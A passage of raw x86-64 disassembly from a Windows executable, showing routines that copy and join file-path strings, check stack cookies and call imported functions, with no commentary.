   140002d0b:	75 15                	jne    0x140002d22
   140002d0d:	44 39 b7 70 50 00 00 	cmp    %r14d,0x5070(%rdi)
   140002d14:	75 3c                	jne    0x140002d52
   140002d16:	4c 8d b7 70 20 00 00 	lea    0x2070(%rdi),%r14
   140002d1d:	4d 85 f6             	test   %r14,%r14
   140002d20:	74 30                	je     0x140002d52
   140002d22:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002d28:	48 8d 8d 30 1f 00 00 	lea    0x1f30(%rbp),%rcx
   140002d2f:	49 8b d6             	mov    %r14,%rdx
   140002d32:	e8 39 55 00 00       	call   0x140008270
   140002d37:	48 85 c0             	test   %rax,%rax
   140002d3a:	75 09                	jne    0x140002d45
   140002d3c:	48 8d 0d e5 b0 02 00 	lea    0x2b0e5(%rip),%rcx        # 0x14002de28
   140002d43:	eb 82                	jmp    0x140002cc7
   140002d45:	48 8d 8d 30 1f 00 00 	lea    0x1f30(%rbp),%rcx
   140002d4c:	ff 15 46 a3 02 00    	call   *0x2a346(%rip)        # 0x14002d098
   140002d52:	e8 59 34 00 00       	call   0x1400061b0
   140002d57:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002d5c:	45 85 ff             	test   %r15d,%r15d
   140002d5f:	75 49                	jne    0x140002daa
   140002d61:	48 8b d7             	mov    %rdi,%rdx
   140002d64:	48 8b c8             	mov    %rax,%rcx
   140002d67:	e8 f4 30 00 00       	call   0x140005e60
   140002d6c:	85 c0                	test   %eax,%eax
   140002d6e:	75 3a                	jne    0x140002daa
   140002d70:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   140002d75:	48 8b cf             	mov    %rdi,%rcx
   140002d78:	e8 43 2c 00 00       	call   0x1400059c0
   140002d7d:	85 c0                	test   %eax,%eax
   140002d7f:	75 1f                	jne    0x140002da0
   140002d81:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140002d86:	e8 b5 2b 00 00       	call   0x140005940
   140002d8b:	85 c0                	test   %eax,%eax
   140002d8d:	75 11                	jne    0x140002da0
   140002d8f:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140002d94:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002d99:	e8 62 32 00 00       	call   0x140006000
   140002d9e:	eb 14                	jmp    0x140002db4
   140002da0:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140002da5:	e8 66 2e 00 00       	call   0x140005c10
   140002daa:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002daf:	e8 7c 33 00 00       	call   0x140006130
   140002db4:	4d 85 f6             	test   %r14,%r14
   140002db7:	0f 84 e0 00 00 00    	je     0x140002e9d
   140002dbd:	48 8d 87 70 20 00 00 	lea    0x2070(%rdi),%rax
   140002dc4:	4d 8b c6             	mov    %r14,%r8
   140002dc7:	4c 2b c0             	sub    %rax,%r8
   140002dca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002dd0:	0f b6 10             	movzbl (%rax),%edx
   140002dd3:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140002dd8:	2b d1                	sub    %ecx,%edx
   140002dda:	75 07                	jne    0x140002de3
   140002ddc:	48 ff c0             	inc    %rax
   140002ddf:	85 c9                	test   %ecx,%ecx
   140002de1:	75 ed                	jne    0x140002dd0
   140002de3:	85 d2                	test   %edx,%edx
   140002de5:	74 4a                	je     0x140002e31
   140002de7:	48 8d 9f 70 30 00 00 	lea    0x3070(%rdi),%rbx
   140002dee:	4d 8b ce             	mov    %r14,%r9
   140002df1:	48 8b cb             	mov    %rbx,%rcx
   140002df4:	4c 8d 05 e5 ab 02 00 	lea    0x2abe5(%rip),%r8        # 0x14002d9e0
   140002dfb:	ba 00 10 00 00       	mov    $0x1000,%edx
   140002e00:	e8 db f0 ff ff       	call   0x140001ee0
   140002e05:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140002e0a:	0f 8d bc fe ff ff    	jge    0x140002ccc
   140002e10:	c7 87 74 50 00 00 01 	movl   $0x1,0x5074(%rdi)
   140002e17:	00 00 00 
   140002e1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002e20:	0f b6 03             	movzbl (%rbx),%eax
   140002e23:	88 83 00 10 00 00    	mov    %al,0x1000(%rbx)
   140002e29:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   140002e2d:	84 c0                	test   %al,%al
   140002e2f:	75 ef                	jne    0x140002e20
   140002e31:	48 85 f6             	test   %rsi,%rsi
   140002e34:	74 32                	je     0x140002e68
   140002e36:	48 8d 15 13 b0 02 00 	lea    0x2b013(%rip),%rdx        # 0x14002de50
   140002e3d:	48 8b ce             	mov    %rsi,%rcx
   140002e40:	e8 4b 3a 01 00       	call   0x140016890
   140002e45:	85 c0                	test   %eax,%eax
   140002e47:	75 07                	jne    0x140002e50
   140002e49:	e8 52 4f 00 00       	call   0x140007da0
   140002e4e:	eb 18                	jmp    0x140002e68
   140002e50:	48 8d 15 09 b0 02 00 	lea    0x2b009(%rip),%rdx        # 0x14002de60
   140002e57:	48 8b ce             	mov    %rsi,%rcx
   140002e5a:	e8 31 3a 01 00       	call   0x140016890
   140002e5f:	85 c0                	test   %eax,%eax
   140002e61:	75 05                	jne    0x140002e68
   140002e63:	e8 88 51 00 00       	call   0x140007ff0
   140002e68:	48 8b cf             	mov    %rdi,%rcx
   140002e6b:	e8 b0 f9 ff ff       	call   0x140002820
   140002e70:	48 8b cf             	mov    %rdi,%rcx
   140002e73:	e8 e8 f7 ff ff       	call   0x140002660
   140002e78:	48 8b cf             	mov    %rdi,%rcx
   140002e7b:	8b d8                	mov    %eax,%ebx
   140002e7d:	e8 8e f9 ff ff       	call   0x140002810
   140002e82:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140002e87:	e8 84 2d 00 00       	call   0x140005c10
   140002e8c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002e91:	e8 9a 32 00 00       	call   0x140006130
   140002e96:	8b c3                	mov    %ebx,%eax
   140002e98:	e9 34 fe ff ff       	jmp    0x140002cd1
   140002e9d:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   140002ea2:	48 8b cf             	mov    %rdi,%rcx
   140002ea5:	e8 16 f8 ff ff       	call   0x1400026c0
   140002eaa:	85 c0                	test   %eax,%eax
   140002eac:	0f 85 1a fe ff ff    	jne    0x140002ccc
   140002eb2:	e8 b9 4e 00 00       	call   0x140007d70
   140002eb7:	48 8d 97 70 30 00 00 	lea    0x3070(%rdi),%rdx
   140002ebe:	48 8d 0d 33 ae 02 00 	lea    0x2ae33(%rip),%rcx        # 0x14002dcf8
   140002ec5:	e8 d6 44 00 00       	call   0x1400073a0
   140002eca:	48 8d 0d 27 ae 02 00 	lea    0x2ae27(%rip),%rcx        # 0x14002dcf8
   140002ed1:	e8 5a 40 00 00       	call   0x140006f30
   140002ed6:	e8 45 f9 ff ff       	call   0x140002820
   140002edb:	48 85 f6             	test   %rsi,%rsi
   140002ede:	74 32                	je     0x140002f12
   140002ee0:	48 8d 15 69 af 02 00 	lea    0x2af69(%rip),%rdx        # 0x14002de50
   140002ee7:	48 8b ce             	mov    %rsi,%rcx
   140002eea:	e8 a1 39 01 00       	call   0x140016890
   140002eef:	85 c0                	test   %eax,%eax
   140002ef1:	75 07                	jne    0x140002efa
   140002ef3:	e8 a8 4e 00 00       	call   0x140007da0
   140002ef8:	eb 18                	jmp    0x140002f12
   140002efa:	48 8d 15 5f af 02 00 	lea    0x2af5f(%rip),%rdx        # 0x14002de60
   140002f01:	48 8b ce             	mov    %rsi,%rcx
   140002f04:	e8 87 39 01 00       	call   0x140016890
   140002f09:	85 c0                	test   %eax,%eax
   140002f0b:	75 05                	jne    0x140002f12
   140002f0d:	e8 de 50 00 00       	call   0x140007ff0
   140002f12:	4d 8b cc             	mov    %r12,%r9
   140002f15:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002f1a:	45 8b c5             	mov    %r13d,%r8d
   140002f1d:	48 8b d7             	mov    %rdi,%rdx
   140002f20:	e8 2b 45 00 00       	call   0x140007450
   140002f25:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140002f2a:	8b d8                	mov    %eax,%ebx
   140002f2c:	e8 df 2c 00 00       	call   0x140005c10
   140002f31:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002f36:	e8 f5 31 00 00       	call   0x140006130
   140002f3b:	83 bf 74 50 00 00 01 	cmpl   $0x1,0x5074(%rdi)
   140002f42:	75 0c                	jne    0x140002f50
   140002f44:	48 8d 8f 70 30 00 00 	lea    0x3070(%rdi),%rcx
   140002f4b:	e8 c0 41 00 00       	call   0x140007110
   140002f50:	48 8b cf             	mov    %rdi,%rcx
   140002f53:	e8 18 ef ff ff       	call   0x140001e70
   140002f58:	8b c3                	mov    %ebx,%eax
   140002f5a:	e9 72 fd ff ff       	jmp    0x140002cd1
   140002f5f:	cc                   	int3
   140002f60:	4c 8b c1             	mov    %rcx,%r8
   140002f63:	4c 2b c2             	sub    %rdx,%r8
   140002f66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002f6d:	00 00 00 
   140002f70:	0f b6 02             	movzbl (%rdx),%eax
   140002f73:	41 88 04 10          	mov    %al,(%r8,%rdx,1)
   140002f77:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140002f7b:	84 c0                	test   %al,%al
   140002f7d:	75 f1                	jne    0x140002f70
   140002f7f:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140002f86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002f8d:	00 00 00 
   140002f90:	80 7c 01 01 00       	cmpb   $0x0,0x1(%rcx,%rax,1)
   140002f95:	48 8d 40 01          	lea    0x1(%rax),%rax
   140002f99:	75 f5                	jne    0x140002f90
   140002f9b:	c7 44 08 fd 70 6b 67 	movl   $0x676b70,-0x3(%rax,%rcx,1)
   140002fa2:	00 
   140002fa3:	b8 01 00 00 00       	mov    $0x1,%eax
   140002fa8:	c3                   	ret
   140002fa9:	cc                   	int3
   140002faa:	cc                   	int3
   140002fab:	cc                   	int3
   140002fac:	cc                   	int3
   140002fad:	cc                   	int3
   140002fae:	cc                   	int3
   140002faf:	cc                   	int3
   140002fb0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002fb5:	57                   	push   %rdi
   140002fb6:	48 83 ec 20          	sub    $0x20,%rsp
   140002fba:	48 8b da             	mov    %rdx,%rbx
   140002fbd:	48 8b f9             	mov    %rcx,%rdi
   140002fc0:	48 8b cb             	mov    %rbx,%rcx
   140002fc3:	ba 5c 00 00 00       	mov    $0x5c,%edx
   140002fc8:	e8 5f 92 00 00       	call   0x14000c22c
   140002fcd:	48 85 c0             	test   %rax,%rax
   140002fd0:	75 10                	jne    0x140002fe2
   140002fd2:	8d 50 2f             	lea    0x2f(%rax),%edx
   140002fd5:	48 8b cb             	mov    %rbx,%rcx
   140002fd8:	e8 4f 92 00 00       	call   0x14000c22c
   140002fdd:	48 85 c0             	test   %rax,%rax
   140002fe0:	74 04                	je     0x140002fe6
   140002fe2:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140002fe6:	48 2b fb             	sub    %rbx,%rdi
   140002fe9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002ff0:	0f b6 03             	movzbl (%rbx),%eax
   140002ff3:	88 04 1f             	mov    %al,(%rdi,%rbx,1)
   140002ff6:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   140002ffa:	84 c0                	test   %al,%al
   140002ffc:	75 f2                	jne    0x140002ff0
   140002ffe:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003003:	b8 01 00 00 00       	mov    $0x1,%eax
   140003008:	48 83 c4 20          	add    $0x20,%rsp
   14000300c:	5f                   	pop    %rdi
   14000300d:	c3                   	ret
   14000300e:	cc                   	int3
   14000300f:	cc                   	int3
   140003010:	40 53                	rex push %rbx
   140003012:	48 83 ec 20          	sub    $0x20,%rsp
   140003016:	4c 8b ca             	mov    %rdx,%r9
   140003019:	4c 8d 05 c0 a9 02 00 	lea    0x2a9c0(%rip),%r8        # 0x14002d9e0
   140003020:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003025:	48 8b d9             	mov    %rcx,%rbx
   140003028:	e8 b3 ee ff ff       	call   0x140001ee0
   14000302d:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003032:	7c 08                	jl     0x14000303c
   140003034:	33 c0                	xor    %eax,%eax
   140003036:	48 83 c4 20          	add    $0x20,%rsp
   14000303a:	5b                   	pop    %rbx
   14000303b:	c3                   	ret
   14000303c:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140003043:	80 7c 03 01 00       	cmpb   $0x0,0x1(%rbx,%rax,1)
   140003048:	48 8d 40 01          	lea    0x1(%rax),%rax
   14000304c:	75 f5                	jne    0x140003043
   14000304e:	80 7c 18 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rbx,1)
   140003053:	75 05                	jne    0x14000305a
   140003055:	c6 44 18 ff 00       	movb   $0x0,-0x1(%rax,%rbx,1)
   14000305a:	ba 5c 00 00 00       	mov    $0x5c,%edx
   14000305f:	48 8b cb             	mov    %rbx,%rcx
   140003062:	e8 c5 91 00 00       	call   0x14000c22c
   140003067:	48 85 c0             	test   %rax,%rax
   14000306a:	74 0e                	je     0x14000307a
   14000306c:	c6 00 00             	movb   $0x0,(%rax)
   14000306f:	b8 01 00 00 00       	mov    $0x1,%eax
   140003074:	48 83 c4 20          	add    $0x20,%rsp
   140003078:	5b                   	pop    %rbx
   140003079:	c3                   	ret
   14000307a:	66 c7 03 2e 00       	movw   $0x2e,(%rbx)
   14000307f:	b8 01 00 00 00       	mov    $0x1,%eax
   140003084:	48 83 c4 20          	add    $0x20,%rsp
   140003088:	5b                   	pop    %rbx
   140003089:	c3                   	ret
   14000308a:	cc                   	int3
   14000308b:	cc                   	int3
   14000308c:	cc                   	int3
   14000308d:	cc                   	int3
   14000308e:	cc                   	int3
   14000308f:	cc                   	int3
   140003090:	40 53                	rex push %rbx
   140003092:	b8 30 30 00 00       	mov    $0x3030,%eax
   140003097:	e8 a4 83 00 00       	call   0x14000b440
   14000309c:	48 2b e0             	sub    %rax,%rsp
   14000309f:	48 8b 05 9a cf 03 00 	mov    0x3cf9a(%rip),%rax        # 0x140040040
   1400030a6:	48 33 c4             	xor    %rsp,%rax
   1400030a9:	48 89 84 24 20 30 00 	mov    %rax,0x3020(%rsp)
   1400030b0:	00 
   1400030b1:	48 8b d9             	mov    %rcx,%rbx
   1400030b4:	48 8d 94 24 20 10 00 	lea    0x1020(%rsp),%rdx
   1400030bb:	00 
   1400030bc:	33 c9                	xor    %ecx,%ecx
   1400030be:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400030c4:	ff 15 76 9f 02 00    	call   *0x29f76(%rip)        # 0x14002d040
   1400030ca:	85 c0                	test   %eax,%eax
   1400030cc:	75 17                	jne    0x1400030e5
   1400030ce:	48 8d 15 ab ad 02 00 	lea    0x2adab(%rip),%rdx        # 0x14002de80
   1400030d5:	48 8d 0d c4 ad 02 00 	lea    0x2adc4(%rip),%rcx        # 0x14002dea0
   1400030dc:	e8 7f ef ff ff       	call   0x140002060
   1400030e1:	33 c0                	xor    %eax,%eax
   1400030e3:	eb 74                	jmp    0x140003159
   1400030e5:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400030eb:	48 8d 94 24 20 10 00 	lea    0x1020(%rsp),%rdx
   1400030f2:	00 
   1400030f3:	48 8b cb             	mov    %rbx,%rcx
   1400030f6:	e8 85 52 00 00       	call   0x140008380
   1400030fb:	48 85 c0             	test   %rax,%rax
   1400030fe:	75 10                	jne    0x140003110
   140003100:	48 8d 0d b1 ad 02 00 	lea    0x2adb1(%rip),%rcx        # 0x14002deb8
   140003107:	e8 f4 ee ff ff       	call   0x140002000
   14000310c:	33 c0                	xor    %eax,%eax
   14000310e:	eb 49                	jmp    0x140003159
   140003110:	48 8b cb             	mov    %rbx,%rcx
   140003113:	e8 58 01 00 00       	call   0x140003270
   140003118:	85 c0                	test   %eax,%eax
   14000311a:	74 38                	je     0x140003154
   14000311c:	4c 8b cb             	mov    %rbx,%r9
   14000311f:	4c 8d 05 ba a8 02 00 	lea    0x2a8ba(%rip),%r8        # 0x14002d9e0
   140003126:	ba 00 10 00 00       	mov    $0x1000,%edx
   14000312b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003130:	e8 ab ed ff ff       	call   0x140001ee0
   140003135:	3d 00 10 00 00       	cmp    $0x1000,%eax
   14000313a:	7d a5                	jge    0x1400030e1
   14000313c:	48 8b d3             	mov    %rbx,%rdx
   14000313f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003144:	e8 87 03 00 00       	call   0x1400034d0
   140003149:	33 c9                	xor    %ecx,%ecx
   14000314b:	85 c0                	test   %eax,%eax
   14000314d:	0f 95 c1             	setne  %cl
   140003150:	8b c1                	mov    %ecx,%eax
   140003152:	eb 05                	jmp    0x140003159
   140003154:	b8 01 00 00 00       	mov    $0x1,%eax
   140003159:	48 8b 8c 24 20 30 00 	mov    0x3020(%rsp),%rcx
   140003160:	00 
   140003161:	48 33 cc             	xor    %rsp,%rcx
   140003164:	e8 37 83 00 00       	call   0x14000b4a0
   140003169:	48 81 c4 30 30 00 00 	add    $0x3030,%rsp
   140003170:	5b                   	pop    %rbx
   140003171:	c3                   	ret
   140003172:	cc                   	int3
   140003173:	cc                   	int3
   140003174:	cc                   	int3
   140003175:	cc                   	int3
   140003176:	cc                   	int3
   140003177:	cc                   	int3
   140003178:	cc                   	int3
   140003179:	cc                   	int3
   14000317a:	cc                   	int3
   14000317b:	cc                   	int3
   14000317c:	cc                   	int3
   14000317d:	cc                   	int3
   14000317e:	cc                   	int3
   14000317f:	cc                   	int3
   140003180:	b8 78 20 00 00       	mov    $0x2078,%eax
   140003185:	e8 b6 82 00 00       	call   0x14000b440
   14000318a:	48 2b e0             	sub    %rax,%rsp
   14000318d:	48 8b 05 ac ce 03 00 	mov    0x3ceac(%rip),%rax        # 0x140040040
   140003194:	48 33 c4             	xor    %rsp,%rax
   140003197:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   14000319e:	00 
   14000319f:	48 8b d1             	mov    %rcx,%rdx
   1400031a2:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400031a8:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400031ad:	e8 be 50 00 00       	call   0x140008270
   1400031b2:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400031b7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400031bc:	e8 87 36 01 00       	call   0x140016848
   1400031c1:	33 c9                	xor    %ecx,%ecx
   1400031c3:	85 c0                	test   %eax,%eax
   1400031c5:	0f 94 c1             	sete   %cl
   1400031c8:	8b c1                	mov    %ecx,%eax
   1400031ca:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   1400031d1:	00 
   1400031d2:	48 33 cc             	xor    %rsp,%rcx
   1400031d5:	e8 c6 82 00 00       	call   0x14000b4a0
   1400031da:	48 81 c4 78 20 00 00 	add    $0x2078,%rsp
   1400031e1:	c3                   	ret
   1400031e2:	cc                   	int3
   1400031e3:	cc                   	int3
   1400031e4:	cc                   	int3
   1400031e5:	cc                   	int3
   1400031e6:	cc                   	int3
   1400031e7:	cc                   	int3
   1400031e8:	cc                   	int3
   1400031e9:	cc                   	int3
   1400031ea:	cc                   	int3
   1400031eb:	cc                   	int3
   1400031ec:	cc                   	int3
   1400031ed:	cc                   	int3
   1400031ee:	cc                   	int3
   1400031ef:	cc                   	int3
   1400031f0:	40 53                	rex push %rbx
   1400031f2:	b8 50 20 00 00       	mov    $0x2050,%eax
   1400031f7:	e8 44 82 00 00       	call   0x14000b440
   1400031fc:	48 2b e0             	sub    %rax,%rsp
   1400031ff:	48 8b 05 3a ce 03 00 	mov    0x3ce3a(%rip),%rax        # 0x140040040
   140003206:	48 33 c4             	xor    %rsp,%rax
   140003209:	48 89 84 24 40 20 00 	mov    %rax,0x2040(%rsp)
   140003210:	00 
   140003211:	48 8b da             	mov    %rdx,%rbx
   140003214:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000321a:	48 8b d1             	mov    %rcx,%rdx
   14000321d:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003222:	e8 49 50 00 00       	call   0x140008270
   140003227:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   14000322d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003232:	48 8b d3             	mov    %rbx,%rdx
   140003235:	e8 36 50 00 00       	call   0x140008270
   14000323a:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000323f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003244:	e8 8b 39 01 00       	call   0x140016bd4
   140003249:	48 8b 8c 24 40 20 00 	mov    0x2040(%rsp),%rcx
   140003250:	00 
   140003251:	48 33 cc             	xor    %rsp,%rcx
   140003254:	e8 47 82 00 00       	call   0x14000b4a0
   140003259:	48 81 c4 50 20 00 00 	add    $0x2050,%rsp
   140003260:	5b                   	pop    %rbx
   140003261:	c3                   	ret
   140003262:	cc                   	int3
   140003263:	cc                   	int3
   140003264:	cc                   	int3
   140003265:	cc                   	int3
   140003266:	cc                   	int3
   140003267:	cc                   	int3
   140003268:	cc                   	int3
   140003269:	cc                   	int3
   14000326a:	cc                   	int3
   14000326b:	cc                   	int3
   14000326c:	cc                   	int3
   14000326d:	cc                   	int3
   14000326e:	cc                   	int3
   14000326f:	cc                   	int3
   140003270:	b8 48 20 00 00       	mov    $0x2048,%eax
   140003275:	e8 c6 81 00 00       	call   0x14000b440
   14000327a:	48 2b e0             	sub    %rax,%rsp
   14000327d:	48 8b 05 bc cd 03 00 	mov    0x3cdbc(%rip),%rax        # 0x140040040
   140003284:	48 33 c4             	xor    %rsp,%rax
   140003287:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   14000328e:	00 
   14000328f:	48 8b d1             	mov    %rcx,%rdx
   140003292:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003298:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000329d:	e8 ce 4f 00 00       	call   0x140008270
   1400032a2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400032a7:	e8 c4 4c 00 00       	call   0x140007f70
   1400032ac:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   1400032b3:	00 
   1400032b4:	48 33 cc             	xor    %rsp,%rcx
   1400032b7:	e8 e4 81 00 00       	call   0x14000b4a0
   1400032bc:	48 81 c4 48 20 00 00 	add    $0x2048,%rsp
   1400032c3:	c3                   	ret
   1400032c4:	cc                   	int3
   1400032c5:	cc                   	int3
   1400032c6:	cc                   	int3
   1400032c7:	cc                   	int3
   1400032c8:	cc                   	int3
   1400032c9:	cc                   	int3
   1400032ca:	cc                   	int3
   1400032cb:	cc                   	int3
   1400032cc:	cc                   	int3
   1400032cd:	cc                   	int3
   1400032ce:	cc                   	int3
   1400032cf:	cc                   	int3
   1400032d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400032d5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400032da:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400032df:	57                   	push   %rdi
   1400032e0:	48 83 ec 20          	sub    $0x20,%rsp
   1400032e4:	49 8b f0             	mov    %r8,%rsi
   1400032e7:	4c 8b ca             	mov    %rdx,%r9
   1400032ea:	bd 00 10 00 00       	mov    $0x1000,%ebp
   1400032ef:	4c 8d 05 ea a6 02 00 	lea    0x2a6ea(%rip),%r8        # 0x14002d9e0
   1400032f6:	8b d5                	mov    %ebp,%edx
   1400032f8:	48 8b f9             	mov    %rcx,%rdi
   1400032fb:	e8 e0 eb ff ff       	call   0x140001ee0
   140003300:	48 63 c8             	movslq %eax,%rcx
   140003303:	48 81 f9 ff 0f 00 00 	cmp    $0xfff,%rcx
   14000330a:	73 66                	jae    0x140003372
   14000330c:	80 7c 39 ff 5c       	cmpb   $0x5c,-0x1(%rcx,%rdi,1)
   140003311:	74 0a                	je     0x14000331d
   140003313:	66 c7 04 39 5c 00    	movw   $0x5c,(%rcx,%rdi,1)
   140003319:	48 83 c1 02          	add    $0x2,%rcx
   14000331d:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   140003324:	48 2b e9             	sub    %rcx,%rbp
   140003327:	48 8b c3             	mov    %rbx,%rax
   14000332a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003330:	48 ff c0             	inc    %rax
   140003333:	80 3c 06 00          	cmpb   $0x0,(%rsi,%rax,1)
   140003337:	75 f7                	jne    0x140003330
   140003339:	48 3b c5             	cmp    %rbp,%rax
   14000333c:	73 34                	jae    0x140003372
   14000333e:	80 7c 30 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rsi,1)
   140003343:	4c 8b c5             	mov    %rbp,%r8
   140003346:	48 8b d6             	mov    %rsi,%rdx
   140003349:	48 8b cf             	mov    %rdi,%rcx
   14000334c:	75 1a                	jne    0x140003368
   14000334e:	e8 ed 35 01 00       	call   0x140016940
   140003353:	80 7c 1f 01 00       	cmpb   $0x0,0x1(%rdi,%rbx,1)
   140003358:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   14000335c:	75 f5                	jne    0x140003353
   14000335e:	c6 44 3b ff 00       	movb   $0x0,-0x1(%rbx,%rdi,1)
   140003363:	48 8b c7             	mov    %rdi,%rax
   140003366:	eb 0c                	jmp    0x140003374
   140003368:	e8 d3 35 01 00       	call   0x140016940
   14000336d:	48 8b c7             	mov    %rdi,%rax
   140003370:	eb 02                	jmp    0x140003374
   140003372:	33 c0                	xor    %eax,%eax
   140003374:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003379:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000337e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003383:	48 83 c4 20          	add    $0x20,%rsp
   140003387:	5f                   	pop    %rdi
   140003388:	c3                   	ret
   140003389:	cc                   	int3
   14000338a:	cc                   	int3
   14000338b:	cc                   	int3
   14000338c:	cc                   	int3
   14000338d:	cc                   	int3
   14000338e:	cc                   	int3
   14000338f:	cc                   	int3
   140003390:	b8 38 20 00 00       	mov    $0x2038,%eax
   140003395:	e8 a6 80 00 00       	call   0x14000b440
   14000339a:	48 2b e0             	sub    %rax,%rsp
   14000339d:	48 8b 05 9c cc 03 00 	mov    0x3cc9c(%rip),%rax        # 0x140040040
   1400033a4:	48 33 c4             	xor    %rsp,%rax
   1400033a7:	48 89 84 24 20 20 00 	mov    %rax,0x2020(%rsp)
   1400033ae:	00 
   1400033af:	48 8b d1             	mov    %rcx,%rdx
   1400033b2:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400033b8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400033bd:	e8 ae 4e 00 00       	call   0x140008270
   1400033c2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400033c7:	e8 84 4c 00 00       	call   0x140008050
   1400033cc:	48 8b 8c 24 20 20 00 	mov    0x2020(%rsp),%rcx
   1400033d3:	00 
   1400033d4:	48 33 cc             	xor    %rsp,%rcx
   1400033d7:	e8 c4 80 00 00       	call   0x14000b4a0
   1400033dc:	48 81 c4 38 20 00 00 	add    $0x2038,%rsp
   1400033e3:	c3                   	ret
   1400033e4:	cc                   	int3
   1400033e5:	cc                   	int3
   1400033e6:	cc                   	int3
   1400033e7:	cc                   	int3
   1400033e8:	cc                   	int3
   1400033e9:	cc                   	int3
   1400033ea:	cc                   	int3
   1400033eb:	cc                   	int3
   1400033ec:	cc                   	int3
   1400033ed:	cc                   	int3
   1400033ee:	cc                   	int3
   1400033ef:	cc                   	int3
   1400033f0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400033f5:	57                   	push   %rdi
   1400033f6:	b8 30 40 00 00       	mov    $0x4030,%eax
   1400033fb:	e8 40 80 00 00       	call   0x14000b440
   140003400:	48 2b e0             	sub    %rax,%rsp
   140003403:	48 8b 05 36 cc 03 00 	mov    0x3cc36(%rip),%rax        # 0x140040040
   14000340a:	48 33 c4             	xor    %rsp,%rax
   14000340d:	48 89 84 24 20 40 00 	mov    %rax,0x4020(%rsp)
   140003414:	00 
   140003415:	48 8b da             	mov    %rdx,%rbx
   140003418:	48 8b f9             	mov    %rcx,%rdi
   14000341b:	48 8b d1             	mov    %rcx,%rdx
   14000341e:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003424:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003429:	e8 42 4e 00 00       	call   0x140008270
   14000342e:	48 85 c0             	test   %rax,%rax
   140003431:	74 74                	je     0x1400034a7
   140003433:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003439:	48 8d 8c 24 20 20 00 	lea    0x2020(%rsp),%rcx
   140003440:	00 
   140003441:	48 8b d3             	mov    %rbx,%rdx
   140003444:	e8 27 4e 00 00       	call   0x140008270
   140003449:	48 85 c0             	test   %rax,%rax
   14000344c:	74 59                	je     0x1400034a7
   14000344e:	45 33 c0             	xor    %r8d,%r8d
   140003451:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003456:	44 39 05 a3 cb 03 00 	cmp    %r8d,0x3cba3(%rip)        # 0x140040000
